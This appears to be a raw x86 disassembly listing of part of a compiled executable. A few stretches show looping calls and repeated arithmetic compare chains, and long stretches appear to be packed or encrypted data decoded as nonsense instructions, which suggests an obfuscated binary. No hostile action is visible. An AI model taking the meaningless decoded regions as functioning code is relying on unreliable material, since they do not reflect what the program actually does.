  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4335fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4335fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4335fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4336d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4336d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4336d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x4336d7
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x4336d7,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43371b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403a61
  403acb:	adc    al,ah
  403acd:	loopne 0x403aef
  403acf:	adc    BYTE PTR [esi+0x7e],bh
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403b46
  403ad7:	cmp    ch,0x7e
  403ada:	dec    edi
  403adb:	das    
  403adc:	xor    BYTE PTR [ebp+0x70c4b76c],cl
  403ae2:	stos   DWORD PTR es:[edi],eax
  403ae3:	scas   eax,DWORD PTR es:[edi]
  403ae4:	add    eax,0x386a42be
  403ae9:	rcl    BYTE PTR [ebx],0x93
  403aec:	repz (bad) 
  403aee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aef:	pop    esi
  403af0:	sbb    esp,edi
  403af2:	arpl   WORD PTR [ebx-0xf],cx
  403af5:	test   eax,0x9ee2969e
  403afa:	sub    al,0xc1
  403afc:	or     bh,al
  403afe:	pop    ebx
  403aff:	adc    DWORD PTR [esi-0x15],edx
  403b02:	jb     0x403a8e
  403b04:	mov    es,WORD PTR [ebx]
  403b06:	mov    ch,0x52
  403b08:	and    al,0x8a
  403b0a:	ret    
  403b0b:	test   al,0xae
  403b0d:	shl    edi,cl
  403b0f:	xor    BYTE PTR ds:0x7418fac3,ah
  403b15:	mov    dh,0x3e
  403b17:	push   ecx
  403b18:	cld    
  403b19:	cli    
  403b1a:	or     al,0x2b
  403b1c:	ret    0x3766
  403b1f:	or     DWORD PTR [esi],esi
  403b21:	inc    ebp
  403b22:	jns    0x403aed
  403b24:	xchg   ebx,eax
  403b25:	scas   eax,DWORD PTR es:[edi]
  403b26:	xchg   ebp,eax
  403b27:	outs   dx,BYTE PTR ds:[esi]
  403b28:	cmc    
  403b29:	es pop ebx
  403b2b:	stos   BYTE PTR es:[edi],al
  403b2c:	(bad)  
  403b2e:	xchg   edx,eax
  403b2f:	adc    eax,0x5d2cc2b9
  403b34:	jg     0x403b68
  403b36:	daa    
  403b37:	scas   eax,DWORD PTR es:[edi]
  403b38:	(bad)  
  403b39:	repnz mov ?,WORD PTR [ecx-0x6]
  403b3d:	and    DWORD PTR [edi+eiz*4+0x4a],ecx
  403b41:	sbb    bl,dh
  403b43:	xchg   edi,eax
  403b44:	cs jbe 0x403ad5
  403b47:	sbb    eax,0xd668535e
  403b4c:	cmp    eax,0xdcca0cf2
  403b51:	outs   dx,DWORD PTR ds:[esi]
  403b52:	or     esp,DWORD PTR [edi]
  403b54:	xchg   esp,eax
  403b55:	adc    BYTE PTR [esi+0x3f546614],dl
  403b5b:	sahf   
  403b5c:	or     al,0xc8
  403b5e:	je     0x403b30
  403b60:	lods   al,BYTE PTR ds:[esi]
  403b61:	mov    dl,0x29
  403b63:	jge    0x403bc6
  403b65:	jmp    0xbe20aa70
  403b6a:	pop    ecx
  403b6b:	mov    ah,bl
  403b6d:	add    ah,BYTE PTR [edx]
  403b6f:	dec    ebx
  403b70:	int    0xdc
  403b72:	or     BYTE PTR ds:0xec75e0fc,dl
  403b78:	or     al,BYTE PTR [edx-0x6f882e2f]
  403b7e:	fnstsw WORD PTR [eax-0x6fbd1946]
  403b84:	lea    eax,[ebp-0x69]
  403b87:	mov    edi,DWORD PTR [ebp-0x4f]
  403b8a:	lods   al,BYTE PTR ds:[esi]
  403b8b:	add    eax,0x281571ff
  403b91:	mov    cl,0xa0
  403b93:	and    ecx,esi
  403b95:	push   edi
  403b96:	pop    edx
  403b97:	fucomip st,st(2)
  403b99:	fsubr  st,st(0)
  403b9b:	and    al,BYTE PTR [edi]
  403b9d:	add    al,0x30
  403b9f:	mov    dl,BYTE PTR [ecx]
  403ba1:	adc    dh,BYTE PTR [edi+0xa93838]
  403ba7:	add    esp,DWORD PTR [esi-0x5b3051f6]
  403bad:	add    al,0xde
  403baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb0:	daa    
  403bb1:	add    al,0x71
  403bb3:	and    edx,DWORD PTR [esi-0x56]
  403bb6:	sub    DWORD PTR [edi+0x7d],0xbe6bd963
  403bbd:	jb     0x403b63
  403bbf:	add    ebp,DWORD PTR [eax]
  403bc1:	sbb    edx,esp
  403bc3:	test   DWORD PTR [eax+0x6e],ebp
  403bc6:	mov    ebp,0xf823760e
  403bcb:	pop    ss
  403bcc:	daa    
  403bcd:	adc    ebx,0x57169240
  403bd3:	xor    BYTE PTR [edi],0xf7
  403bd6:	lods   al,BYTE PTR es:[esi]
  403bd8:	push   es
  403bd9:	fbld   TBYTE PTR [eax+ebp*2-0xc]
  403bdd:	imul   ecx,DWORD PTR [edi+0x3c],0x13
  403be1:	fcmovne st,st(7)
  403be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403be4:	xchg   ebp,eax
  403be5:	leave  
  403be6:	mov    esp,0xb1c8bfcf
  403beb:	mov    ah,0x2a
  403bed:	mov    BYTE PTR [edi],bh
  403bef:	(bad)  
  403bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bf1:	loope  0x403c3a
  403bf3:	sub    edx,0x3bab9b2d
  403bf9:	aam    0x7d
  403bfb:	sub    al,0xc5
  403bfd:	outs   dx,BYTE PTR ds:[esi]
  403bfe:	push   0xffffffb8
  403c00:	pop    es
  403c01:	retf   
  403c02:	pop    esi
  403c03:	int3   
  403c04:	das    
  403c05:	stc    
  403c06:	(bad)  
  403c07:	mov    edi,0x1d51b9e
  403c0c:	mov    esi,0xe700cbe
  403c11:	mov    esp,0xa65100a2
  403c16:	punpckhbw mm4,QWORD PTR [edx+0xe16e84b]
  403c1d:	lahf   
  403c1e:	push   ss
  403c1f:	sub    al,0xa8
  403c21:	cmp    esp,DWORD PTR [ecx]
  403c23:	hlt    
  403c24:	pop    edx
  403c25:	sbb    DWORD PTR [esi],edx
  403c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c28:	fcom   st(2)
  403c2a:	sar    DWORD PTR [ecx],0x97
  403c2d:	jl     0x403bd2
  403c2f:	mov    edx,0x7f666682
  403c34:	retf   0x49fc
  403c37:	jno    0x403c94
  403c39:	daa    
  403c3a:	or     bh,BYTE PTR [ecx]
  403c3c:	or     cl,al
  403c3e:	pop    ebx
  403c3f:	mov    esp,0x3e89a407
  403c44:	or     bl,BYTE PTR [edx-0x14e5575f]
  403c4a:	adc    DWORD PTR [edx-0x73],ebx
  403c4d:	retf   
  403c4e:	push   bp
  403c50:	daa    
  403c51:	out    dx,eax
  403c52:	dec    esp
  403c53:	push   edx
  403c54:	mov    ds:0x663fa058,al
  403c59:	pop    esp
  403c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c5b:	nop
  403c5c:	in     eax,dx
  403c5d:	xor    edi,DWORD PTR [ebx+0x3e58ec1f]
  403c63:	xchg   esp,eax
  403c64:	mov    eax,ds:0x6c4026d4
  403c69:	aas    
  403c6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c6b:	xlat   BYTE PTR ds:[ebx]
  403c6c:	fs xchg ecx,eax
  403c6e:	fild   WORD PTR [eax-0x20cb0fc3]
  403c74:	daa    
  403c75:	call   0x537e:0x207aaff1
  403c7c:	fstp   DWORD PTR [edx-0x7537fdf5]
  403c82:	xor    eax,0x21c0e1f6
  403c87:	fwait
  403c88:	sar    DWORD PTR gs:[eax-0x36],cl
  403c8c:	xchg   ebx,eax
  403c8d:	push   0x4990ab34
  403c92:	pop    esi
  403c93:	mov    edi,DWORD PTR [edx+0x2f426e72]
  403c99:	push   edi
  403c9a:	xor    esp,DWORD PTR [ebx]
  403c9c:	sbb    ch,BYTE PTR [esi+0x89c64ec]
  403ca2:	mov    dl,bh
  403ca4:	add    BYTE PTR [edx],bl
  403ca6:	cmp    esp,DWORD PTR [edi-0x31fe4c0a]
  403cac:	inc    edi
  403cad:	add    ah,BYTE PTR [ebx+0x5d78cce0]
  403cb3:	cwde   
  403cb4:	pop    es
  403cb5:	lock mov cl,0xae
  403cb8:	outs   dx,DWORD PTR ds:[esi]
  403cb9:	sahf   
  403cba:	mov    BYTE PTR [ecx-0x6c17aab0],dh
  403cc0:	jg     0x403d21
  403cc2:	test   al,0xc3
  403cc4:	cmp    ah,BYTE PTR [ecx+eax*4-0x6]
  403cc8:	xchg   ebp,eax
  403cc9:	and    esi,DWORD PTR [eax-0x20]
  403ccc:	loope  0x403c9f
  403cce:	aam    0x1
  403cd0:	aad    0x8a
  403cd2:	or     DWORD PTR [ebx],esp
  403cd4:	push   edi
  403cd5:	aad    0xe1
  403cd7:	dec    edi
  403cd8:	(bad)  
  403cd9:	or     ebx,ebx
  403cdb:	call   0x4b46:0x9cbbb359
  403ce2:	pushf  
  403ce3:	or     ch,al
  403ce5:	jb     0x403d5f
  403ce7:	mov    ch,0x4d
  403ce9:	rol    ebp,1
  403ceb:	inc    edx
  403cec:	lods   eax,DWORD PTR ds:[esi]
  403ced:	leave  
  403cee:	stos   BYTE PTR es:[edi],al
  403cef:	mov    eax,ds:0x5dee90f9
  403cf4:	hlt    
  403cf5:	iret   
  403cf6:	ins    DWORD PTR es:[edi],dx
  403cf7:	scas   al,BYTE PTR es:[edi]
  403cf8:	xor    DWORD PTR [esi+0x53],eax
  403cfb:	mov    esp,0x7cc899d0
  403d00:	mov    edi,0xcc9157db
  403d05:	xchg   edi,eax
  403d06:	and    eax,0x821ed6eb
  403d0b:	aad    0xca
  403d0d:	pop    ebp
  403d0e:	dec    edi
  403d0f:	sub    DWORD PTR [edx+0x6e3f453b],0x85accb75
  403d19:	sub    ah,bh
  403d1b:	add    eax,0xbbfe21fd
  403d20:	xchg   esi,eax
  403d21:	dec    edx
  403d22:	ins    DWORD PTR es:[edi],dx
  403d23:	and    esi,DWORD PTR [esi]
  403d25:	out    dx,al
  403d26:	push   es
  403d27:	ja     0x403d63
  403d29:	adc    al,BYTE PTR [ecx]
  403d2b:	push   ecx
  403d2c:	outs   dx,DWORD PTR ds:[esi]
  403d2d:	lock mov esi,DWORD PTR [ecx-0x558ee337]
  403d34:	pop    ebp
  403d35:	arpl   dx,bp
  403d37:	pop    di
  403d39:	clc    
  403d3a:	fsub   QWORD PTR [ebp-0x1e]
  403d3d:	ins    DWORD PTR es:[edi],dx
  403d3e:	inc    esi
  403d3f:	call   0x9b9a:0xa3a1adcf
  403d46:	imul   ebx,DWORD PTR [ebx+0x6a],0xf69e3e7a
  403d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d4e:	or     DWORD PTR [ebp+0x4],0x78
  403d52:	fcom   st(4)
  403d54:	push   esp
  403d55:	rol    ebx,cl
  403d57:	sbb    BYTE PTR [edx+eiz*1],dh
  403d5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d5b:	push   es
  403d5c:	xchg   esi,eax
  403d5d:	test   eax,0xea766945
  403d62:	dec    edi
  403d63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d64:	jnp    0x403ce7
  403d66:	cmc    
  403d67:	and    eax,0x683f225d
  403d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d6d:	rcl    DWORD PTR [eax],1
  403d6f:	bound  ecx,QWORD PTR [edi-0x5494b3b1]
  403d75:	(bad)  
  403d76:	addr16 push cs
  403d78:	mov    cs,esp
  403d7a:	or     al,0xe6
  403d7c:	jns    0x403d8e
  403d7e:	mov    DWORD PTR [ebx-0x54],edi
  403d81:	cs stc 
  403d83:	ficom  WORD PTR [ebp+0x10]
  403d86:	mov    esp,0xf06fce53
  403d8b:	mov    ds:0x1bab1463,al
  403d90:	xchg   esp,eax
  403d91:	dec    esi
  403d92:	dec    esi
  403d93:	jno    0x403df0
  403d95:	adc    al,0xdb
  403d97:	jbe    0x403d87
  403d99:	imul   ebp,DWORD PTR [edx-0xd7cefeb],0x56
  403da0:	add    eax,0xce29a470
  403da5:	out    dx,al
  403da6:	clc    
  403da7:	adc    edx,DWORD PTR [edi-0x66]
  403daa:	bnd ja 0x403e11
  403dad:	rol    BYTE PTR [ecx+0x449d8c22],0xb2
  403db4:	push   eax
  403db5:	pusha  
  403db6:	pushf  
  403db7:	out    0x84,eax
  403db9:	retf   0x89d0
  403dbc:	mov    ebx,DWORD PTR [ebp-0x10]
  403dbf:	sub    ebx,edi
  403dc1:	cmp    ebx,edx
  403dc3:	ja     0x403dd1
  403dc9:	mov    edx,DWORD PTR [ebp-0x28]
  403dcc:	jmp    0x404176
  403dd1:	mov    edx,DWORD PTR [ebp-0x30]
  403dd4:	mov    edi,DWORD PTR [ebp-0x4]
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0x7a
  403e75:	ja     0x403ea3
  403e77:	aas    
  403e78:	or     bl,BYTE PTR [edi]
  403e7a:	jle    0x403efa
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e1c
  403e81:	push   0x228ed6b2
  403e86:	cmp    ecx,DWORD PTR [esi]
  403e88:	mov    eax,0x78b3ee69
  403e8d:	leave  
  403e8e:	mov    esi,0x75da8f
  403e93:	int3   
  403e94:	cmp    esp,esp
  403e96:	sbb    esp,eax
  403e98:	fsub   QWORD PTR [edx]
  403e9a:	call   0xf3f1:0x2e680d39
  403ea1:	pop    ecx
  403ea2:	jmp    0x403e53
  403ea4:	push   0x0
  403ea6:	sahf   
  403ea7:	in     eax,0x51
  403ea9:	pop    esi
  403eaa:	or     BYTE PTR [eax],cl
  403eac:	adc    bh,BYTE PTR [edx]
  403eae:	push   eax
  403eaf:	jp     0x403ea5
  403eb1:	jge    0x403f16
  403eb3:	out    dx,eax
  403eb4:	adc    al,BYTE PTR [esi-0x755a1363]
  403eba:	mov    bl,0x7
  403ebc:	(bad)  
  403ebd:	jo     0x403f10
  403ebf:	add    dh,bh
  403ec1:	inc    edx
  403ec2:	add    bl,BYTE PTR [edi]
  403ec4:	mov    esi,DWORD PTR [eax+0x2f]
  403ec7:	and    eax,0x766286ef
  403ecc:	pushf  
  403ecd:	jmp    0xc900:0x8e971c1d
  403ed4:	dec    edx
  403ed5:	sub    DWORD PTR [eax+0x3c1b9062],eax
  403edb:	inc    edx
  403edc:	outs   dx,DWORD PTR ds:[esi]
  403edd:	fistp  WORD PTR [ebx+0x583c667c]
  403ee3:	dec    eax
  403ee4:	push   0x32d11148
  403ee9:	pop    esp
  403eea:	mov    eax,0x2cf7cfe
  403eef:	inc    ebp
  403ef0:	ds xor eax,0xe05f773b
  403ef6:	or     dl,BYTE PTR [ebx+edx*4+0x7a]
  403efa:	test   eax,0xf9dcf500
  403eff:	push   edx
  403f00:	pop    es
  403f01:	dec    ebp
  403f02:	inc    eax
  403f03:	mov    eax,0xb87fc932
  403f08:	mov    ah,0xe0
  403f0a:	pop    edx
  403f0b:	shl    DWORD PTR [ecx],1
  403f0d:	scas   eax,DWORD PTR es:[edi]
  403f0e:	outs   dx,DWORD PTR ds:[esi]
  403f0f:	xor    edx,DWORD PTR [edi+ebp*4]
  403f12:	mov    eax,0x8d61a682
  403f17:	dec    eax
  403f18:	jmp    0x403f2d
  403f1a:	fwait
  403f1b:	and    cl,cl
  403f1d:	mov    dl,BYTE PTR [ebx+0x5bb1894]
  403f23:	and    eax,0xa3555188
  403f28:	cld    
  403f29:	nop
  403f2a:	adc    DWORD PTR [ebx-0x80],edi
  403f2d:	out    0xcf,al
  403f2f:	jns    0x403f34
  403f31:	cmp    eax,DWORD PTR [edx]
  403f33:	sbb    ecx,DWORD PTR [eax]
  403f35:	xor    DWORD PTR [edx+0x76],esp
  403f38:	(bad)  
  403f39:	sub    eax,0x597ba869
  403f3e:	out    0x26,al
  403f40:	and    DWORD PTR [edi],ecx
  403f42:	rol    BYTE PTR ds:0xbc870d7f,cl
  403f48:	pop    eax
  403f49:	lods   eax,DWORD PTR ds:[esi]
  403f4a:	(bad)  
  403f4b:	jae    0x403f37
  403f4d:	stos   BYTE PTR es:[edi],al
  403f4e:	fldcw  WORD PTR [edi-0x2d]
  403f51:	pop    edx
  403f52:	adc    ch,BYTE PTR [ebx-0x7160d9a1]
  403f58:	aaa    
  403f59:	or     BYTE PTR [esi-0x2eddcfc6],dl
  403f5f:	into   
  403f60:	add    al,0x68
  403f62:	lock jg 0x403f7e
  403f65:	pop    ds
  403f66:	sbb    BYTE PTR [edi+0x7dfd93d8],0xf2
  403f6d:	call   0x464911b5
  403f72:	add    edx,edx
  403f74:	pushf  
  403f75:	dec    eax
  403f76:	and    eax,0xdd6d9d5c
  403f7b:	sub    esp,DWORD PTR [ebx+0x7e400a8d]
  403f81:	dec    edx
  403f82:	fs cwde 
  403f84:	inc    esi
  403f85:	pop    esp
  403f86:	pushf  
  403f87:	aad    0x34
  403f89:	lahf   
  403f8a:	sbb    al,0x91
  403f8c:	or     al,0xb8
  403f8e:	rcl    BYTE PTR [esi-0x46228225],1
  403f94:	add    bh,BYTE PTR [ecx+esi*2+0x4aafe836]
  403f9b:	frstor [edx]
  403f9d:	xor    al,0x10
  403f9f:	ds stos DWORD PTR es:[edi],eax
  403fa1:	int    0x60
  403fa3:	push   esi
  403fa4:	cmp    esp,DWORD PTR [esi]
  403fa6:	outs   dx,DWORD PTR ds:[esi]
  403fa7:	imul   DWORD PTR [edx+0x436df0ab]
  403fad:	jae    0x403fd8
  403faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fb0:	and    eax,0xc7acea1
  403fb5:	loop   0x404011
  403fb7:	fwait
  403fb8:	sbb    DWORD PTR ds:0xdfb97b24,ecx
  403fbe:	jno    0x403fb6
  403fc0:	test   BYTE PTR [esi+0x29725ee8],dh
  403fc6:	jae    0x403fa6
  403fc8:	test   eax,eax
  403fca:	mov    eax,0xd83315d3
  403fcf:	mov    ch,0xde
  403fd1:	xlat   BYTE PTR ds:[ebx]
  403fd2:	(bad)  
  403fd3:	xor    DWORD PTR [edx+ebp*1-0x55],edi
  403fd7:	rcl    bh,1
  403fd9:	jmp    0x5ca5:0x9780f239
  403fe0:	icebp  
  403fe1:	push   ebp
  403fe2:	xor    eax,0xb5ff87cb
  403fe7:	(bad)  
  403fe8:	sti    
  403fe9:	nop
  403fea:	lods   eax,DWORD PTR ds:[esi]
  403feb:	mov    dh,0x4f
  403fed:	mov    al,0x33
  403fef:	inc    ecx
  403ff0:	pushf  
  403ff1:	xchg   ecx,eax
  403ff2:	cmp    eax,0x414a8e35
  403ff7:	popf   
  403ff8:	jmp    0x57c5:0x2070197
  403fff:	nop
  404000:	dec    eax
  404001:	sahf   
  404002:	adc    esi,DWORD PTR [esi+0x31]
  404005:	mov    al,ds:0x8040f63a
  40400a:	adc    al,0xa4
  40400c:	mov    edi,?
  40400e:	lock scas eax,DWORD PTR es:[edi]
  404010:	popa   
  404011:	dec    ebp
  404012:	call   0x40660094
  404017:	lea    ecx,[ebp-0x18e2a5dd]
  40401d:	(bad)  
  40401e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40401f:	stos   DWORD PTR es:[edi],eax
  404020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404021:	push   es
  404022:	dec    ecx
  404023:	xchg   BYTE PTR [ecx-0x30],al
  404026:	pop    edi
  404027:	in     eax,dx
  404028:	sub    al,0x42
  40402a:	mov    ah,0x9c
  40402c:	imul   bh
  40402e:	and    bl,BYTE PTR [ecx+0xd261217]
  404034:	out    0xac,eax
  404036:	mov    ?,ebx
  404038:	inc    ecx
  404039:	loope  0x403ff3
  40403b:	or     DWORD PTR [esi+0x45054c18],ebp
  404041:	xchg   esi,eax
  404042:	push   0x3d
  404044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404045:	in     eax,dx
  404046:	aaa    
  404047:	mov    WORD PTR [eax],ss
  404049:	inc    edx
  40404a:	add    DWORD PTR [esi],0x29
  40404d:	dec    esp
  40404e:	fadd   st,st(7)
  404050:	pop    edi
  404051:	xchg   esi,eax
  404052:	fimul  WORD PTR [eax-0x2f08fe49]
  404058:	push   cs
  404059:	inc    ebp
  40405a:	cld    
  40405b:	xchg   ecx,eax
  40405c:	jnp    0x404005
  40405e:	es pop ebx
  404060:	cmp    al,0xfe
  404062:	mov    edx,0xd375bfb3
  404067:	jp     0x404067
  404069:	test   DWORD PTR [ecx-0x58e7a9ea],eax
  40406f:	in     eax,0xd5
  404071:	push   0xf1de5f11
  404076:	mov    BYTE PTR [eax-0x1e],ah
  404079:	mov    dl,0xdc
  40407b:	mov    ds:0x80151cbf,al
  404080:	jno    0x40409b
  404082:	fdivr  QWORD PTR [ebp+0x21]
  404085:	adc    bh,BYTE PTR [ebx+0x51]
  404088:	dec    esi
  404089:	sub    bh,BYTE PTR [esi+0x36bf122]
  40408f:	pushf  
  404090:	xlat   BYTE PTR ds:[ebx]
  404091:	(bad)  
  404092:	jg     0x40409b
  404094:	jecxz  0x4040f9
  404096:	jmp    0x6305:0x9dd146a1
  40409d:	mov    esp,0x484de1c6
  4040a2:	mov    eax,0xf02e326e
  4040a7:	or     eax,0xa1125fbb
  4040ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040ad:	loope  0x4040c4
  4040af:	mov    edi,edx
  4040b1:	out    0xe8,eax
  4040b3:	adc    dl,BYTE PTR [esi+0x54]
  4040b6:	pushf  
  4040b7:	cmp    BYTE PTR [esi],ch
  4040b9:	pop    ebp
  4040ba:	rol    DWORD PTR [edi-0x3720adb8],cl
  4040c0:	mov    cl,0x47
  4040c2:	mov    eax,ds:0x90f6e9ac
  4040c7:	mov    ah,BYTE PTR [esi]
  4040c9:	inc    eax
  4040ca:	pop    edx
  4040cb:	add    DWORD PTR [edx],ebx
  4040cd:	jl     0x40411b
  4040cf:	xchg   ebp,eax
  4040d0:	test   ecx,ecx
  4040d2:	xchg   edx,eax
  4040d3:	push   esp
  4040d4:	pop    esi
  4040d5:	outs   dx,BYTE PTR ds:[esi]
  4040d6:	jbe    0x404062
  4040d8:	sub    al,0x9
  4040da:	daa    
  4040db:	bound  edi,QWORD PTR [edi]
  4040dd:	sub    ch,BYTE PTR ds:0x25c82d00
  4040e3:	ss add eax,0x2b8f2135
  4040e9:	add    al,0x11
  4040eb:	les    ebp,FWORD PTR [ebp-0x1139ae77]
  4040f1:	jb     0x40415b
  4040f3:	test   eax,0xee10c81a
  4040f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040f9:	fld    st(4)
  4040fb:	gs out dx,al
  4040fd:	stos   BYTE PTR es:[edi],al
  4040fe:	or     eax,0x6e460223
  404103:	aaa    
  404104:	pop    ss
  404105:	and    eax,0xb941fd5a
  40410a:	xor    BYTE PTR [eax+0x4b],dl
  40410d:	pop    edx
  40410e:	cs int 0x6c
  404111:	xor    bl,BYTE PTR [ecx-0x76]
  404114:	jno    0x404151
  404116:	mov    ecx,0x411f646b
  40411b:	mov    ecx,0x618fcf0d
  404120:	and    esi,DWORD PTR [eax]
  404122:	cmp    dh,BYTE PTR [ebp-0x52de60ca]
  404128:	mov    eax,ds:0xfba5b8a
  40412d:	ja     0x4040cf
  40412f:	push   esi
  404130:	mov    eax,ds:0x8ad406b3
  404135:	dec    ecx
  404136:	out    dx,al
  404137:	xchg   edi,eax
  404138:	sahf   
  404139:	mov    eax,0xf8e1e88a
  40413e:	jle    0x404152
  404140:	cs dec edi
  404142:	pop    eax
  404143:	pop    ds
  404144:	je     0x4040e8
  404146:	ret    
  404147:	out    dx,al
  404148:	pop    ds
  404149:	mov    al,ds:0xaf149f8f
  40414e:	aas    
  40414f:	je     0x40419e
  404151:	popa   
  404152:	(bad)  
  404153:	call   0x39fa:0x9818bfcf
  40415a:	in     al,dx
  40415b:	inc    eax
  40415c:	test   BYTE PTR [ebx-0x66],ch
  40415f:	inc    esp
  404160:	fwait
  404161:	fwait
  404162:	cdq    
  404163:	and    BYTE PTR cs:[ebp-0x25c420d5],cl
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [eax+0x7486b8a6],dl
  40418f:	sbb    eax,0x7c587e7e
  404194:	jle    0x404214
  404196:	in     eax,dx
  404197:	xchg   ecx,eax
  404198:	repz sub eax,0x61fb200
  40419e:	inc    ecx
  40419f:	arpl   si,cx
  4041a1:	lods   eax,DWORD PTR ds:[esi]
  4041a2:	pop    ds
  4041a3:	cmp    al,0xb3
  4041a5:	(bad)  
  4041a6:	inc    edx
  4041a7:	fwait
  4041a8:	and    al,BYTE PTR [ebp-0x2]
  4041ab:	not    esp
  4041ad:	push   es
  4041ae:	sub    DWORD PTR [eax],esp
  4041b0:	jae    0x404199
  4041b2:	xchg   edx,eax
  4041b3:	in     al,0x7f
  4041b5:	lea    ebp,[esp+ebp*8-0x294ed5bf]
  4041bc:	xchg   esi,eax
  4041bd:	pop    DWORD PTR [edx-0x79]
  4041c0:	xchg   ebp,eax
  4041c1:	mov    edx,0x3b1c53df
  4041c6:	fwait
  4041c7:	out    0x64,al
  4041c9:	fs cdq 
  4041cb:	(bad)  
  4041cc:	(bad)  
  4041cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ce:	cmp    bh,0x3
  4041d1:	dec    esp
  4041d2:	aam    0xa5
  4041d4:	test   al,0x33
  4041d6:	or     DWORD PTR [eax],esi
  4041d8:	(bad)  
